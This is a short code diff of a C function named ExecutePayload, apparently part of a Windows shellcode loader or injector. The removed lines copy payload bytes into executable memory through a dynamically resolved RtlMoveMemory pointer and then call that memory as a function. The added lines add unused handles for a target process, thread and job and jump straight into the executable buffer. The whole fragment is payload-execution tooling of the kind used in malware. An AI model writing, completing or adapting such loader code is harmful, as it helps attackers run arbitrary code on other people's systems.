@@ -1,15 +1,11 @@
-void ExecutePayload(void* exec_mem, const unsigned char* payload, SIZE_T payload_len) {
-    if (exec_mem == NULL || payload == NULL) {
-        DEBUG_PRINT("ExecutePayload: Received a NULL pointer. Aborting.");
-        return;
-    }
+void ExecutePayload(void* exec_mem, const unsigned char* payload, SIZE_T payload_len, HANDLE hTargetProcess, HANDLE hTargetThread, HANDLE hJob) {
+    (void)hTargetProcess;
+    (void)hTargetThread;
+    (void)hJob;
+    (void)payload;
+    (void)payload_len;
 
-    pfnRtlMoveMemory(exec_mem, payload, payload_len);
-    DEBUG_PRINT("ExecutePayload: Bytecode copied to executable memory at %p.", exec_mem);
-
-    void (*payload_func)() = (void(*)())exec_mem;
-
-    DEBUG_PRINT("ExecutePayload: Executing payload directly via function pointer...");
-    payload_func();
-    DEBUG_PRINT("ExecutePayload: Payload execution finished.");
+    DEBUG_PRINT("Executing payload via direct function call...");
+    void (*func)() = (void (*)())exec_mem;
+    func();
 }
